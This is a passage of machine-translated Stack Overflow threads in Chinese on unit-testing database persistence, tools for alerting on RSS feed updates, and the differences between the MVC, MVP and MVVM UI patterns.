我在对持久性进行单元测试时遇到的问题，尤其是在没有 ORM 并因此模拟您的数据库（连接）的情况下，您并不真正知道您的查询是否成功。可能是您的查询是专门为特定数据库版本设计的，并且仅在该版本上成功。如果你模拟你的数据库，你永远不会发现这一点。因此，在我看来，单元测试持久性的用途有限。您应该始终添加针对目标数据库运行的测试。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-08-05T11:20:38.330

对于`NHibernate`，我肯定会提倡只是嘲笑`NHibernate API`for 单元测试——相信库会做正确的事情。如果要确保数据实际进入数据库，请进行集成测试。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2014-07-09T09:20:23.467

For JDBC based projects, my Acolyte framework can be used: [http://acolyte.eu.org](http://acolyte.eu.org) . It allows to mockup data access you want to tests, benefiting from JDBC abstraction, without having to manage a specific test DB.

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-08-05T10:19:08.563

我还会模拟数据库，并检查查询是否符合您的预期。存在测试检查错误 sql 的风险，但这会在集成测试中检测到

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2008-08-05T11:27:08.550

从技术上讲，持久性的单元测试不是单元测试。它们是集成测试。

在 C# 中使用 mbUnit，您只需使用`SqlRestoreInfo`and`RollBack`属性：

```
 [TestFixture]
    [SqlRestoreInfo(<connectionsting>, <name>,<backupLocation>]
    public class Tests
    {

        [SetUp]
        public void Setup()
        {

        }

        [Test]
        [RollBack]
        public void TEST()
        {
           //test insert. 
        }
    } 
```

在 NUnit 中也可以这样做，只是属性名称略有不同。

至于检查，如果您的查询成功，您通常需要在其后进行第二次查询，以查看数据库是否已按预期更改。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2008-08-27T21:17:21.787

I usually create a repository, use that to save my entity and retrieve a fresh one. Then I assert that the retrieved is equal to the saved.

# rss - 监控特定的 RSS

> ID：2048
> 
> 赞同：13
> 
> 时间：2008-08-05T09:45:41.377
> 
> 标签：rss

对于我订阅的所有 RSS 提要，我使用我喜欢的[Google Reader](http://www.google.com/reader/)。但是，我确实有一些特定的 RSS 提要，我希望在它们更新后立即收到通知（例如，我喜欢监控并尽快回复的论坛的 RSS 提要）。

是否有任何工具可用于此类监控，并且还具有某种警报功能（例如，提示窗口）？

我已经尝试过[Simbolic RSS Alert](http://web.archive.org/web/20110615171752/http://www.simbolic.net:80/software/rssalert/)，但我发现它有点问题，无法让它像我喜欢的那样频繁地提醒我。

建议？或者也许是 Simbolic 的不同体验？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-08-05T10:50:35.393

如果您可以访问 Microsoft Outlook 2007 或 Thunderbird，这些电子邮件客户端允许您以与添加电子邮件帐户相同的方式添加 RSS 提要。

我一般使用 Google Reader，但当我想了解特定内容的最新信息时，我会将 RSS 提要添加到 Outlook，它会像电子邮件一样到达我的收件箱。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-08-05T10:05:07.187

RSS 不是“推送”，这意味着你需要有一些东西来轮询网站。这比获取整个网站或首页的流量要少得多（例如，您可以说“给我所有比我上次要求更新的文章”），但它仍然是流量。

人们普遍认为，您在自动客户端中的刷新时间不应超过 30 分钟。（需要引用）。

话虽如此，您可能会找到一个允许您设置更频繁刷新的客户端。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-08-05T10:06:38.323

当新项目出现在 RSS 提要中时，我使用[Pingie](http://www.pingie.com)向我发送 SMS。如果您有手机短信计划，也许它对您有用。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-08-05T10:15:37.617

[RSS2mail](http://exo.org.uk/code/rss2mail/)是一个简单的 python 脚本，几年前我广泛使用它。

正如 Matthew 所说，您真的不应该比生产者允许的更多地打扰 RSS 提要，但是您可以使用 http 标头以非常轻松的方式检查更改，这是 rss2email 做得很好的事情。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-08-05T10:24:08.367

你总是可以自己敲一些东西……我过去做过，写一个 RSS 解析器真的不是太难。

当然，正如其他人所提到的，存在一个礼仪问题，即您希望在 RSS 请求流量中为自己占用多少网站的宝贵带宽。那是你自己良心的问题。;)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-08-11T13:22:00.913

我使用[RSS Bandit](http://www.rss-bandit.com/)（适用于 Windows）来了解我的 RSS 提要/博客的最新信息。

不过还有[很多其他的 RSS 聚合器应用程序](http://en.wikipedia.org/wiki/List_of_feed_aggregators)。

如果您不想要另一个“大”应用程序但拥有 Windows Vista，您还可以选择让 Internet Explorer 监控 RSS 提要并使用提要侧边栏应用程序（德文版称为“Feedschlagzeilen，英文版不确定）自带Vista，显示最新头条。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-08-11T13:32:26.230

阅读所有答案提醒我，我实际上从未考虑过使用 Firefox 插件解决这个问题。我很快就找到了[Update Scanner](https://addons.mozilla.org/en-US/firefox/addon/3362)，我认为它看起来很有前途！

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-09-15T17:09:08.247

我喜欢旧版本的[feedreader](http://www.feedreader.com/)用于这种用途，当有新东西进来时，系统托盘中的图标开始旋转（新版本从灰色变为黄色）。

也可以为每条新消息发出警报。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2011-12-22T21:52:28.080

Since you mentioned a pop-up, I'll add [Feed Notifier](http://feednotifier.com) to the list. It sits in the Windows Tray (or whatever they call it now in Windows 7) and pops up a notification when there are new entries to your feeds. You can set it up with multiple feeds, each with its own polling interval. When there are new entries, it pops up a prompt which you can dismiss or click to go to the entry. You are able to go back and review recent entries later, even if you clicked to dismiss them the first time. If your PC is asleep when a new entry is added, you will be notified the next time you wake it up.

# user-interface - 什么是 MVP 和 MVC，有什么区别？

> ID：2056
> 
> 赞同：2274
> 
> 时间：2008-08-05T10:06:33.020
> 
> 标签：user-interface, model-view-controller, design-patterns, terminology, mvp

当超越[RAD](https://en.wikipedia.org/wiki/Rapid_application_development)（拖放和配置）构建用户界面的方式时，许多工具鼓励您可能会遇到三种设计模式，称为[Model-View-Controller](http://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller)、[Model-View-Presenter](http://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93presenter)和[Model-View-ViewModel](http://en.wikipedia.org/wiki/Model_View_ViewModel)。我的问题分为三个部分：

1.  这些模式解决了哪些问题？
2.  它们有何相似之处？
3.  它们有何不同？

* * *

## 回答 #1

> 赞同：2082
> 
> 时间：2008-09-19T12:46:52.687

## 模型-视图-演示者

在**MVP**中，Presenter 包含 View 的 UI 业务逻辑。View 委托的所有调用都直接发送给 Presenter。Presenter 也直接与 View 解耦，并通过接口与其对话。这是为了允许在单元测试中模拟视图。MVP 的一个共同属性是必须有大量的双向调度。例如，当有人单击“保存”按钮时，事件处理程序将委托给 Presenter 的“OnSave”方法。保存完成后，Presenter 将通过其接口回调 View，以便 View 可以显示保存已完成。

MVP 往往是在 WebForms 中实现分离表示的一种非常自然的模式。原因是视图总是首先由 ASP.NET 运行时创建。您可以[找到有关这两种变体的更多信息](https://web.archive.org/web/20071211153445/http://www.codeplex.com/websf/Wiki/View.aspx?title=MVPDocumentation)。

### 两个主要变体

**被动视图：**视图尽可能愚蠢，包含几乎为零的逻辑。Presenter 是与 View 和 Model 对话的中间人。View 和 Model 完全相互屏蔽。Model 可能会引发事件，但 Presenter 订阅它们以更新 View。在 Passive View 中没有直接的数据绑定，相反，View 公开了 Presenter 用来设置数据的 setter 属性。所有状态都在 Presenter 而不是 View 中管理。

*   Pro：最大的可测试性表面；视图和模型的清晰分离
*   缺点：当您自己进行所有数据绑定时，需要做更多工作（例如所有 setter 属性）。

**监督控制器：**演示者处理用户手势。View 通过数据绑定直接绑定到 Model。在这种情况下，Presenter 的工作是将 Model 传递给 View，以便它可以绑定到它。Presenter 还将包含诸如按下按钮、导航等手势的逻辑。

*   优点：通过利用数据绑定减少了代码量。
*   缺点：可测试的表面较少（因为数据绑定），并且视图中的封装较少，因为它直接与模型对话。

## 模型-视图-控制器

在**MVC**中，Controller 负责确定显示哪个 View 以响应任何操作，包括应用程序加载的时间。这与 MVP 不同，MVP 中的操作通过 View 路由到 Presenter。在 MVC 中，视图中的每个操作都与对控制器的调用以及操作相关联。在 Web 中，每个操作都涉及对 URL 的调用，在该 URL 的另一端有一个控制器进行响应。一旦该控制器完成其处理，它将返回正确的视图。该序列在应用程序的整个生命周期中以这种方式继续：

```
    视图中的操作
        -> 调用控制器
        -> 控制器逻辑
        -> 控制器返回视图。

```

MVC 的另一大区别是视图不直接绑定到模型。视图只是呈现并且是完全无状态的。在 MVC 的实现中，视图通常不会在后面的代码中包含任何逻辑。这与绝对必要的 MVP 相反，因为如果 View 不委托给 Presenter，它将永远不会被调用。

## 演示模型

要查看的另一种模式是**演示模型**图案。在此模式中，没有 Presenter。相反，视图直接绑定到表示模型。演示模型是专门为视图制作的模型。这意味着该模型可以公开永远不会放在域模型上的属性，因为这将违反关注点分离。在这种情况下，Presentation Model 绑定到域模型并可能订阅来自该模型的事件。然后 View 订阅来自 Presentation Model 的事件并相应地更新自己。演示模型可以公开视图用于调用操作的命令。这种方法的优点是您可以从根本上完全删除代码隐藏，因为 PM 完全封装了视图的所有行为。[模型-视图-视图模型](http://msdn.microsoft.com/en-us/magazine/dd419663.aspx)。

有[一篇关于表示模型的 MSDN 文章](http://msdn.microsoft.com/en-us/library/ff921080.aspx)和WPF （前 Prism）的[复合应用程序指南中关于](http://msdn.microsoft.com/en-us/library/cc707819.aspx)[分离表示模式的部分](http://msdn.microsoft.com/en-us/library/cc707862.aspx)

* * *

## 回答 #2

> 赞同：497
> 
> 时间：2013-07-06T22:18:01.420

这是对这些设计模式的许多变体的过度简化，但这就是我喜欢思考两者之间差异的方式。

**MVC**

![MVC](../Images/95d25f2701fef3873767d77d524e8d73.png)

**MVP**

![在此处输入图像描述](../Images/3cb054d900700e6370f8af3af3972ef7.png)

* * *

## 回答 #3

> 赞同：438
> 
> 时间：2008-08-05T10:21:13.783

不久前，我在博客上写了这篇文章，引用了[Todd Snyder 关于两者区别的优秀文章](http://blogs.infragistics.com/blogs/todd_snyder/archive/2007/10/17/mvc-or-mvp-pattern-whats-the-difference.aspx)：

> 以下是模式之间的主要区别：
> 
> **MVP模式**
> 
> *   视图与模型的耦合更松散。演示者负责将模型绑定到视图。
> *   更容易进行单元测试，因为与视图的交互是通过接口进行的
> *   通常以一对一的方式查看演示者地图。复杂视图可能有多个演示者。
> 
> **MVC 模式**
> 
> *   控制器基于行为，可以跨视图共享
> *   可以负责确定显示哪个视图

这是我能在网上找到的最好的解释。

* * *

## 回答 #4

> 赞同：275
> 
> 时间：2014-09-12T20:47:56.560

这是代表通信流程的插图

![在此处输入图像描述](../Images/2770cb701f39609ed7147b257ff6704e.png)

![在此处输入图像描述](../Images/dad16bba04c62cd9c8200c3f879c63a7.png)

* * *

## 回答 #5

> 赞同：181
> 
> 时间：2008-08-25T21:22:00.217

MVP*不一定*是 View 负责的场景（例如，参见 Taligent 的 MVP）。
不幸的是，人们仍然将其作为一种模式（负责视图）而不是反模式来宣传，因为它与“这只是一个视图”（实用程序员）相矛盾。“这只是一个视图”表明向用户显示的最终视图是应用程序的次要关注点。Microsoft 的 MVP 模式使 Views 的重用变得更加困难，并且*方便*地为 Microsoft 的设计人员提供了鼓励不良做法的借口。

坦率地说，我认为 MVC 的基本问题适用于任何 MVP 实现，并且差异几乎完全是语义上的。只要您遵循视图（显示数据）、控制器（初始化和控制用户交互）和模型（底层数据和/或服务）之间的关注点分离，那么您就可以获得 MVC 的好处. 如果您正在实现收益，那么谁真正关心您的模式是 MVC、MVP 还是监督控制器？唯一*真正的*模式仍然是 MVC，其余的只是它的不同风格。

考虑一下[这篇](https://lostechies.com/derekgreer/2007/08/25/interactive-application-architecture/)非常激动人心的文章，它全面列出了许多这些不同的实现。您可能会注意到，它们基本上都在做同样的事情，但略有不同。

我个人认为 MVP 只是最近才作为一个吸引人的术语重新引入，以减少语义偏执者之间争论某事是否真正 MVC 或证明微软快速应用程序开发工具的合理性。在我的书中，这些原因都不能证明它作为一种单独的设计模式存在是合理的。

* * *

## 回答 #6

> 赞同：120
> 
> 时间：2008-08-06T22:51:07.717

### MVP：视图负责。

在大多数情况下，视图会创建其演示者。演示者将与模型交互并通过界面操作视图。视图有时会与演示者交互，通常是通过一些界面。这归结为实施；您希望视图调用演示者的方法还是希望视图具有演示者侦听的事件？归结为：视图了解演示者。视图委托给演示者。

### MVC：控制器负责。

控制器是根据一些事件/请求创建或访问的。然后控制器创建适当的视图并与模型交互以进一步配置视图。归结为：控制器创建和管理视图；视图是控制器的从属。视图不知道控制器。

* * *

## 回答 #7

> 赞同：82
> 
> 时间：2015-12-20T02:10:22.470

[![在此处输入图像描述](../Images/8a3274711f0140cc4919b9a065df86f2.png)](https://i.stack.imgur.com/A7cSy.jpg)

**MVC（模型视图控制器）**

输入首先指向控制器，而不是视图。该输入可能来自与页面交互的用户，但也可能来自简单地将特定 url 输入浏览器。在任何一种情况下，它都是一个控制器，用于启动某些功能。Controller 和 View 之间是多对一的关系。这是因为单个控制器可能会根据正在执行的操作选择不同的视图来呈现。注意从控制器到视图的单向箭头。这是因为视图不了解或引用控制器。控制器确实传回了模型，因此在视图和传递给它的预期模型之间存在知识，但提供它的控制器却没有。

**MVP（模型视图展示器）**

输入从 View 开始，而不是 Presenter。View 和关联的 Presenter 之间存在一对一的映射。View 持有对 Presenter 的引用。Presenter 还对从 View 触发的事件做出反应，因此它知道与之关联的 View。Presenter 根据它对模型执行的请求操作更新视图，但视图不知道模型。

更多[参考](http://geekswithblogs.net/dlussier/archive/2009/11/21/136454.aspx)

* * *

## 回答 #8

> 赞同：73
> 
> 时间：2018-04-06T13:51:19.743

这个问题有很多答案，但我觉得需要一些非常简单的答案来清楚地比较两者。这是我在用户在 MVP 和 MVC 应用程序中搜索电影名称时编造的讨论：

用户：点击点击……</p>

*观点*：那是谁？[**最有价值球员**| **MVC** ]

用户：我刚刚点击了搜索按钮……</p>

*观点*：好的，等一下…… [**最有价值球员**| **MVC** ]

（*视图*调用*Presenter* | *Controller* ...） [ **MVP** | **MVC** ]

*视图*：嘿*主持人*| *控制器*，一个用户刚刚点击了搜索按钮，我该怎么办？[**最有价值球员**| **MVC** ]

*主持人*| *控制器*：嘿*视图*，那个页面上有搜索词吗？[**最有价值球员**| **MVC** ]

*View* : 是的，……这里是……“钢琴” [ **MVP** | **MVC** ]

*主持人*| *控制器*：谢谢*View*，... 同时我正在查找*模型*上的搜索词，请给他/她显示一个进度条 [ **MVP** | **MVC** ]

（*Presenter* | *Controller*正在调用*模型*……） [ **MVP** | **MVC** ]

*主持人*| *控制器*：嘿*模型*，你有这个搜索词匹配吗？：“钢琴” [ **MVP** | **MVC** ]

*型号*：嘿*主持人*| *控制器*，让我检查... [ **MVP** | **MVC** ]

（*模型*正在对电影数据库进行查询……） [ **MVP** | **MVC** ]

（ 过了一会儿 ... ）

-------------- 这就是 MVP 和 MVC 开始分歧的地方 ---------------

*型号*：我为您找到了一个列表，*Presenter*，这里是 JSON “[{"name":"Piano Teacher","year":2001},{"name":"Piano","year":1993} ]” [ **MVP** ]

*模型*：有一些可用的结果，*控制器*。我在我的实例中创建了一个字段变量并用结果填充它。它的名字是“searchResultsList”[ **MVC** ]

（*Presenter* | *Controller*感谢*Model*并返回*View*） [ **MVP** | **MVC** ]

*主持人*：感谢您等待*查看*，我为您找到了匹配结果列表，并将它们排列成一个像样的格式：[“钢琴老师2001”，“钢琴1993”]。请在垂直列表中显示给用户。也请现在隐藏进度条[ **MVP** ]

*控制器*：感谢您等待*View*，我已经向*Model*询问了您的搜索查询。它说它找到了一个匹配结果列表并将它们存储在其实例内名为“searchResultsList”的变量中。你可以从那里得到它。也请现在隐藏进度条 [ **MVC** ]

*观点*：非常感谢*Presenter* [ **MVP** ]

*视图*：谢谢“控制器”[ **MVC** ]（现在*视图*在质疑自己：我应该如何将我从*模型*中获得的结果呈现给用户？电影的制作年份应该排在第一个还是最后一个......？应该在垂直或水平列表中？...）

如果您有兴趣，我一直在写一系列关于应用程序架构模式（MVC、MVP、MVVP、干净架构等）的文章，并附有一个 Github 存储[库](http://www.digigene.com/android-architecture-wolfkcats)。即使该示例是为 android 编写的，其基本原理也可以应用于任何媒体。

* * *

## 回答 #9

> 赞同：41
> 
> 时间：2017-11-29T10:14:19.633

* * *

## 回答 #10

> 赞同：37
> 
> 时间：2008-08-05T10:22:55.653

*   MVP = 模型-视图-演示者
*   MVC = 模型-视图-控制器

    1.  两种演示模式。它们将模型（想想域对象）、屏幕/网页（视图）以及 UI 的行为方式（演示者/控制器）之间的依赖关系分开
    2.  它们在概念上非常相似，人们根据口味对 Presenter/Controller 进行不同的初始化。
    3.  一篇关于差异的好文章在[这里](http://www.infragistics.com/community/blogs/todd_snyder/archive/2007/10/17/mvc-or-mvp-pattern-whats-the-difference.aspx)。最值得注意的是 MVC 模式让模型更新视图。

* * *

## 回答 #11

> 赞同：35
> 
> 时间：2008-08-08T05:55:12.633

另外值得记住的是，MVP 也有不同类型。Fowler 将模式分为两种——被动视图和监督控制器。

使用被动视图时，您的视图通常会实现一个细粒度的界面，其属性或多或少直接映射到底层 UI 小部件。例如，您可能有一个具有名称和地址等属性的 ICustomerView。

您的实现可能如下所示：

```
public class CustomerView : ICustomerView
{
    public string Name
    { 
        get { return txtName.Text; }
        set { txtName.Text = value; }
    }
} 
```

您的 Presenter 类将与模型对话并将其“映射”到视图。这种方法称为“被动视图”。好处是视图易于测试，并且更容易在 UI 平台（Web、Windows/XAML 等）之间移动。缺点是您不能利用数据绑定之类的东西（这在[WPF](http://en.wikipedia.org/wiki/Windows_Presentation_Foundation)和[Silverlight等框架中](http://en.wikipedia.org/wiki/Microsoft_Silverlight)*非常*强大）。

MVP 的第二种风格是监督控制器。在这种情况下，您的 View 可能有一个名为 Customer 的属性，然后再次将其数据绑定到 UI 小部件。您不必考虑同步和微观管理视图，监督控制器可以在需要时介入并提供帮助，例如复杂的交互逻辑。

MVP 的第三种“风格”（或者有人可能称其为单独的模式）是 Presentation Model（或有时称为 Model-View-ViewModel）。与 MVP 相比，您将 M 和 P “合并”为一个类。您有您的 UI 小部件数据绑定到的客户对象，但您也有额外的 UI 特定字段，如“IsButtonEnabled”或“IsReadOnly”等。

我认为我发现的关于 UI 架构的最佳资源是 Jeremy Miller 在[The Build Your Own CAB Series Table of Contents](http://codebetter.com/blogs/jeremy.miller/archive/2007/07/25/the-build-your-own-cab-series-table-of-contents.aspx)上完成的一系列博客文章。他涵盖了 MVP 的所有风格，并展示了 C# 代码来实现它们。

我还在*[YouCard Re-visited: Implementing the ViewModel pattern](http://jonas.follesoe.no/2008/07/19/youcard-re-visited-implementing-the-viewmodel-pattern)*上发表了关于 Silverlight 上下文中的 Model-View-ViewModel 模式的博客。

* * *

## 回答 #12

> 赞同：21
> 
> 时间：2008-08-05T10:20:20.340

这两个框架都旨在分离关注点——例如，与数据源（模型）、应用程序逻辑（或将这些数据转化为有用信息）（控制器/演示器）和显示代码（视图）的交互。在某些情况下，该模型还可用于将数据源转换为更高级别的抽象。[MVC Storefront 项目](http://blog.wekeroad.com/mvc-storefront/)就是一个很好的例子。

[这里](http://codebetter.com/blogs/jeremy.miller/archive/2007/10/31/development-trivial-pursuit-the-difference-between-mvc-and-the-different-flavors-of-mvp.aspx)有一个关于 MVC 与 MVP 之间差异的讨论。

区别在于，在 MVC 应用程序中，视图和控制器传统上与模型交互，但彼此之间不交互。

MVP 设计让 Presenter 访问模型并与视图交互。

话虽如此，ASP.NET MVC 根据这些定义是一个 MVP 框架，因为控制器访问模型以填充视图，这意味着没有逻辑（仅显示控制器提供的变量）。

要了解 ASP.NET MVC 与 MVP 的区别，请查看Scott Hanselman 的[MIX 演示文稿](http://www.hanselman.com/blog/ASPNETMVCSessionAtMix08TDDAndMvcMockHelpers.aspx)。

* * *

## 回答 #13

> 赞同：14
> 
> 时间：2008-09-21T12:32:14.983

两者都是试图分离表示和业务逻辑的模式，将业务逻辑与 UI 方面解耦

在架构上，MVP 是基于页面控制器的方法，而 MVC 是基于前端控制器的方法。这意味着在 MVP 标准 Web 表单中，页面生命周期只是通过从后面的代码中提取业务逻辑来增强。换句话说，页面是服务于 http 请求的一个。换句话说，MVP 恕我直言是网络表单进化类型的增强。另一方面，MVC 完全改变了游戏，因为请求在页面加载之前被控制器类拦截，业务逻辑在那里执行，然后在控制器处理刚刚转储到页面（“视图”）的数据的最终结果中从某种意义上说，MVC 看起来（至少在我看来）很像使用路由引擎增强的 MVP 的监督控制器风格

它们都启用了 TDD，并且各有优缺点。

恕我直言，如何选择其中之一的决定应基于一个人在 ASP NET Web 表单类型的 Web 开发上投入了多少时间。如果有人认为自己擅长 Web 表单，我会建议 MVP。如果人们在页面生命周期等方面感觉不太舒服，那么 MVC 可能是一种方法。

这是另一个博客文章链接，提供有关此主题的更多详细信息

[http://blog.vuscode.com/malovicn/archive/2007/12/18/model-view-presenter-mvp-vs-model-view-controller-mvc.aspx](http://blog.vuscode.com/malovicn/archive/2007/12/18/model-view-presenter-mvp-vs-model-view-controller-mvc.aspx)

* * *

## 回答 #14

> 赞同：10
> 
> 时间：2009-01-02T10:35:25.617

我使用过 MVP 和 MVC，虽然我们作为开发人员倾向于关注这两种模式的技术差异，但 IMHO 中 MVP 的重点更多地与易于采用有关。

如果我在一个已经在 Web 表单开发风格方面具有良好背景的团队工作，那么引入 MVP 比 MVC 容易得多。我会说这种情况下的 MVP 是一个快速的胜利。

我的经验告诉我，将团队从 Web 表单转移到 MVP，然后从 MVP 转移到 MVC 相对容易；从 Web 表单迁移到 MVC 更加困难。

我在这里留下了一个链接，指向我的一个朋友发表的关于 MVP 和 MVC 的一系列文章。

[http://www.qsoft.be/post/Building-the-MVP-StoreFront-Gutthrie-style.aspx](http://www.qsoft.be/post/Building-the-MVP-StoreFront-Gutthrie-style.aspx)

* * *

## 回答 #15

> 赞同：9
> 
> 时间：2013-06-07T21:16:38.563

在 MVP 中，视图从演示者中提取数据，演示者从模型中提取和准备/规范化数据，而在 MVC 中，控制器通过视图中的推送从模型中提取数据并设置。

在 MVP 中，您可以让单个视图与多种类型的演示者一起使用，而单个演示者可以与不同的多个视图一起使用。

MVP 通常使用某种绑定框架，例如 Microsoft WPF 绑定框架或 HTML5 和 Java 的各种绑定框架。

在这些框架中，UI/HTML5/XAML 知道每个 UI 元素显示的演示者的哪些属性，因此当您将视图绑定到演示者时，视图会查找属性并知道如何从它们中提取数据以及如何当用户在 UI 中更改值时设置它们。

因此，例如，如果模型是汽车，那么演示者就是某种汽车演示者，将汽车属性（年份、制造商、座位等）暴露给视图。视图知道名为“汽车制造商”的文本字段需要显示演示者制造商属性。

然后，您可以将许多不同类型的演示者绑定到视图，所有演示者都必须具有 Maker 属性 - 它可以是飞机、火车或其他任何东西，视图无关紧要。视图从演示者那里获取数据——不管是哪一个——只要它实现了一个约定的接口。

这个绑定框架，如果你把它拆掉，它实际上是控制器:-)

因此，您可以将 MVP 视为 MVC 的演变。

MVC 很棒，但问题在于它通常是每个视图的控制器。控制器 A 知道如何设置视图 A 的字段。如果现在，您希望视图 A 显示模型 B 的数据，您需要控制器 A 知道模型 B，或者您需要控制器 A 接收具有接口的对象 - 这就像MVP 仅没有绑定，或者您需要在 Controller B 中重写 UI 集代码。

结论 - MVP 和 MVC 都是 UI 模式的解耦，但 MVP 通常使用绑定框架，其底层是 MVC。因此，MVP 处于比 MVC 更高的架构级别，并且是 MVC 之上的包装器模式。

* * *

## 回答 #16

> 赞同：7
> 
> 时间：2013-02-20T16:55:37.280

我谦虚的短视：MVP 用于大规模，MVC 用于小规模。使用 MVC，我有时会觉得 V 和 C 可能被视为单个不可分割组件的两侧，而不是直接绑定到 M，而当缩小到更短的比例时，如 UI 控件和基本小部件，不可避免地会落入这一点。在这种粒度级别上，MVP 没有什么意义。相反，当一个更大的规模时，适当的接口变得更加重要，与明确的职责分配相同，MVP 出现了。

另一方面，当平台特性有利于组件之间的某种关系时，这种规模经验法则的重要性可能很小，比如在 Web 中，MVC 似乎比 MVP 更容易实现。

* * *

## 回答 #17

> 赞同：7
> 
> 时间：2019-05-10T01:43:07.370

我认为 Erwin Vandervalk 的这张图片（以及随附的[文章](https://blogs.msdn.microsoft.com/erwinvandervalk/2009/08/14/the-difference-between-model-view-viewmodel-and-other-separated-presentation-patterns/)）是对 MVC、MVP 和 MVVM 以及它们的相似之处和不同之处的最佳解释。[文章](https://blogs.msdn.microsoft.com/erwinvandervalk/2009/08/14/the-difference-between-model-view-viewmodel-and-other-separated-presentation-patterns/)没有出现在“MVC、MVP 和 MVVM”查询的搜索引擎结果中，因为文章的标题不包含“MVC”和“MVP”字样；但我认为这是最好的解释。

![图片解释 MVC、MVP 和 MVVM - 作者 Erwin Vandervalk](../Images/e9e5a27378608652ae586b270ac0c1ee.png)

（[这篇文章](https://blogs.msdn.microsoft.com/erwinvandervalk/2009/08/14/the-difference-between-model-view-viewmodel-and-other-separated-presentation-patterns/)也符合 Bob Martin 叔叔在他的一次演讲中所说的：MVC 最初是为小的 UI 组件设计的，而不是为系统的架构设计的）

* * *

## 回答 #18

> 赞同：6
> 
> 时间：2015-09-09T02:34:56.930

MVC 有很多版本，这个答案是关于 Smalltalk 中的原始 MVC。简而言之，就是 [![mvc 与 mvp 的图像](../Images/53ec66d33e6266b5759bdb03b26d80e2.png)](https://i.stack.imgur.com/aebJI.png)

这个[droidcon NYC 2017 演讲 - 使用架构组件的清洁应用程序设计](https://www.youtube.com/watch?v=i1-7S-RxfvQ)澄清了这一点

[![在此处输入图像描述](../Images/dddb11056a29be18b4297cb3eafc022e.png)](https://i.stack.imgur.com/wPqMA.png) [![在此处输入图像描述](../Images/3d0ec194fa310d342412c2b8b89f988d.png)](https://i.stack.imgur.com/fTNfE.png)

* * *

## 回答 #19

> 赞同：5
> 
> 时间：2017-11-16T17:32:06.220

最简单的答案是视图如何与模型交互。在 MVP 中，视图由演示者更新，演示者充当视图和模型之间的中介。演示者从视图中获取输入，从模型中检索数据，然后执行所需的任何业务逻辑，然后更新视图。在 MVC 中，模型直接更新视图，而不是通过控制器返回。

* * *

## 回答 #20

> 赞同：5
> 
> 时间：2018-01-25T21:24:22.600

Bob 叔叔有一段很棒[的](https://www.youtube.com/watch?v=WpkDN78P884&feature=youtu.be&t=29m1s)视频，最后他简要解释了**MVC**和**MVP**。

IMO，MVP 是 MVC 的改进版本，您基本上将要显示的内容（数据）与要显示的方式（视图）分开。Presenter 包含了你的 UI 的业务逻辑，隐含地强加了应该呈现的数据，并给你一个哑视图模型列表。当需要显示数据时，您只需将视图（可能包含相同的 id）插入适配器并使用那些视图模型设置相关的视图字段，并引入最少的代码（仅使用 setter）。它的主要好处是您可以针对许多/各种视图测试您的 UI 业务逻辑，例如在水平列表或垂直列表中显示项目。

在 MVC 中，我们通过接口（边界）来粘合不同的层。控制器是我们架构的插件，但它没有这样的限制来强加显示什么。从这个意义上说，MVP 是一种 MVC，其概念是视图可通过适配器插入控制器。

我希望这有助于更好。

* * *

## 回答 #21

> 赞同：3
> 
> 时间：2019-10-22T10:03:42.460

您忘记了**Action-Domain-Responder** ( [ADR](https://en.wikipedia.org/wiki/Action%E2%80%93domain%E2%80%93responder) )。

如上图所示，MVC 中的**模型**和**视图之间存在直接关系/链接。**在**Controller**上执行一个动作，这将在**Model**上执行一个动作。**模型**中的那个动作，**会触发****视图**中的反应。**View**总是在**Model**的状态发生变化时更新。

有些人一直忘记，MVC[是在 70 年代末创建的](https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller#History)，而 Web 只是在 80 年代末/90 年代初创建的。MVC 最初不是为 Web 创建的，而是为桌面应用程序创建的，其中控制器，模型和视图将共存。

因为我们使用的 Web 框架（*例如：.Laravel*）仍然使用相同的命名约定（*model-view-controller*），所以我们倾向于认为它一定是 MVC，但实际上它是另外一回事。

相反，请查看[Action-Domain-Responder](https://en.wikipedia.org/wiki/Action%E2%80%93domain%E2%80%93responder)。在 ADR 中，**Controller**获得一个**Action**，它将在**Model/Domain**中执行操作。到目前为止，相同。不同之处在于，它然后收集该操作的响应/数据，并将其传递给**响应**程序（*例如：.`view()`*）进行渲染。当在同一个组件上请求新的操作时，**控制器**会再次被调用，并且循环会重复。在 ADR 中，模型/域和视图（*响应者的响应*）之间**没有任何联系。**

 ***注意：** Wikipedia 声明“*然而，每个 ADR 操作都由单独的类或闭包表示。* ”。这**不一定**是真的。多个Action可以在同一个Controller中，模式还是一样的。

[mvc](/questions/tagged/mvc "显示标记为“mvc”的问题") [adr](/questions/tagged/adr "显示标记为“adr”的问题") [模型视图控制器](/questions/tagged/model-view-controller "显示标记为“模型视图控制器”的问题") [动作域响应程序](/questions/tagged/action-domain-responder "显示标记为“动作域响应者”的问题")

* * *

## 回答 #22

> 赞同：3
> 
> 时间：2021-10-26T23:59:23.450

# MVC（模型-视图-控制器）

在 MVC 中，Controller 是负责人！控制器根据一些事件/请求被触发或访问，然后管理视图。

MVC 中的视图实际上是无状态的，控制器负责选择要显示的视图。

**例如：**当用户点击“Show MyProfile”按钮时，Controller 被触发。它与模型通信以获取适当的数据。然后，它会显示一个类似于配置文件页面的新视图。控制器可以从模型中获取数据并将其直接提供给视图（如上图所示），或者让视图从模型本身获取数据。

# MVP（模型-视图-演示者）

在 MVP 中，视图是负责人！每个 View 调用它的 Presenter 或者有一些 Presenter 监听的事件。

MVP 中的视图不实现任何逻辑，Presenter 负责实现所有逻辑并使用某种接口与视图通信。

